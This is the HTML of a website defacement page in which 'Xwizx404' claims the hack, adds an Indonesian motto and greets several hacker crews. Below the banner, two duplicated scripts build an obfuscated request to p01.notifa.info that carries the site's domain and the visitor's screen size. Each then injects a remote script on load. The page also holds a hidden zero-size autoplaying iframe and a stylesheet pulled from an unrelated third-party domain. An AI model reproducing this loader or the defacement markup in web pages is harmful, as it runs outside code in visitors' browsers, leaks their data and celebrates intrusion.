<html>
<head>
<title>&#1203;&#824;&#1202;&#824;&#1203; ~ Hacked by Xwizx404 ~ &#1203;&#824;&#1202;&#824;&#1203;</title>
<meta content=' Hacked by Xwizx404' name='description'/>
<meta content=' Hacked by Xwizx404' name='keywords'/>
<meta content='Hacked by Xwizx404' name='Abstract'/>
<meta name="title" content="Hacked by Xwizx404 ~">
<meta name="description" content="$ No Sytem Is Safe $">
<meta name="keywords" content="~ Hacked by Xwizx404 ~">
<meta name="googlebot" content="index,follow" />
<meta name="robots" content="all" />
<meta name="robots schedule" content="auto" />
<meta name="distribution" content="global" />
</head>
<style>
	@import url('https://fonts.googleapis.com/css?family=New+Rocker');
	@import url('https://fonts.googleapis.com/css?family=Iceland');
</style>
<body>
	<body bgcolor="#000" marginwidth="0" marginheight="0" style="background: black url(https://pre00.deviantart.net/767c/th/pre/i/2014/329/6/2/payday_2_deathwish_skull_background_by_ashthenyan-d87ngoa.png) no-repeat center center fixed; -webkit-background-size: cover; -moz-background-size: cover; -o-background-size: cover; background-size:cover;" onload="type_text()" bottommargin="0" rightmargin="0" leftmargin="0" topmargin="0">

<link rel="stylesheet" type="text/css" href="http://magelliott.com/images/comment_images/tolol.css">
		<table width=100% height=100%><td align=center>
		<span style='font: 10px courier;size:50px;color:red;text-shadow:white 0px 0px 15px;'>
		<font face="Iceland" size="8" color='white' style='text-shadow: 0 0 3px aqua, 0px 0px 5px aqua;'>
		Hacked By<font face="Iceland" size="8" color='red' style='text-shadow: 0 0 3px aqua, 0px 0px 5px aqua;'>
		~ Hacked by Xwizx404 ~</div></font></br>
	<center><img src="https://i.ytimg.com/vi/5oRcU691AdY/mqdefault.jpg" height="380px" width="320px"><br>
		<font face="Iceland" size="5px" color="red">$ Jadilah kamu seperti mouse. Kamu bisa menjadi penunjuk arah untuk orang yang membutuhkan petunjuk. $</font><br>
		<font face="Iceland" size="4px" color="white" style="text-shadow: 0 0 3px aqua, 0 0 5px aqua;">IndoXploit - ./XnoxID - LCRX999 Dx666 ~ XENXA7ION - Mr.7z - Ruby007 - MamaHMudA - ./L1ght_R00t - IT CLA-X - Dev19feb - Vlyn - Yukiteru404 - R3V0 - Typical Idiot Security - Phantom Ghost - 0N3R1D3R - Pr070n - ./LoliSecID-<font style="font-weight: bold; color: blue; text-shadow: 0 0 3px aqua, 0 0 5px aqua;"> ~ Xwizx404<br><br></font>
	</center>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + 4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mWzY58Ma8YyVwaiPaco%2bYmgGh7AtNKK1WEaLHP8f2%2ftX%2bKLzrhKQn9KDTC%2bB8HhQxOfpZMz%2fke9B5VCnv8p8s8bN8x%2fsFPu6HjHeGgx3JWHIUKnVRRKYYeSbWQ3%2feTm9TwsJq4kkax%2b88dQc%2bcju9f%2bN4LdvPOVckOgFyJqXzhL%2fhTkm0PRvd34a5f67Q4j0LSZDgM6SAetZY9GHgPzQqjrSKNR9KVYQPfGHRFkzszTeOC0BRLY2NpM6nPwL6a1Jy5WKmkyqf3FqYtq%2f4SFFMYHEctQc3vqMRV2xGc9ZTiYtFZH%2f2El6W%2frgsjqrRDcVMrajGLsS8AOHm84wCQkSjwcz9qjw%2fqVdWTiQTR2mZEvgQKgoXrDlngwCH1HVmEQqB3Jslr1ILB6oedXbGIc7hWN5lMCN9Eco9UGJ9gO3fVeMlwFPyYYK6ltGHdqGp2REXAupFhH%2b3XdhUsPU8FKqHdj1LzWqy%2bFR1JKhYDD3f8NxVZhoL9460WwLY71UBsBnt30U3w4IxjgM%3d + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script><script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + 4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mKVlOREAmC4eUMM0fOlLmercQWVqcelaJOwk3br%2fgeYBx0vT%2fhNGf%2b%2bjit4Cnj2K9ipLpqedWD1q1rgRhFeUyZkuYBt0lCeRGsoB9ptZp03F9mMi%2fOhgBC57EvPgewZHrM4oSqtjbmfG3o7HZKePl9EAEBm6v74yVfoppu3K0J8Q8ve%2fYqEUIpdj3JQvZUp8hnDi8XV2BMLNeb66CU2hxGcB295EFKdmoqnQIKVhA3FxxrJyxFEA0a0KJ6TkVtzhCfpPtyyVaj%2fqN0KhV040dxqcBWsoRejll29f8E1ex3zHbvw%2fWPngHrFkEus499N0sprdlcqy3Di7GsVZNvX9Rym4DZqw9Jho9ZLn%2blYuFKDmgD%2fPqWL5linhorwa4syz7o7WlZPgsd2efBpMocw85HWlNmErh3yrLm8HqeE0tZ%2bSHYITa9IjwZ4rngfbwbG%2fzGr%2f4VrQB0251xU%2fV2j6KJVzEbQM69d4rbIKCZZC0Bsxi82jqW9NPBVvPQli7c%2fZGe0MDOL3E2e3xwvw3BqcrfQ%3d%3d + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
<iframe width='0' height='0' src='https://www.youtube.com/embed/ic32fCzyqJ0?autoplay=1'0'></iframe>
</html>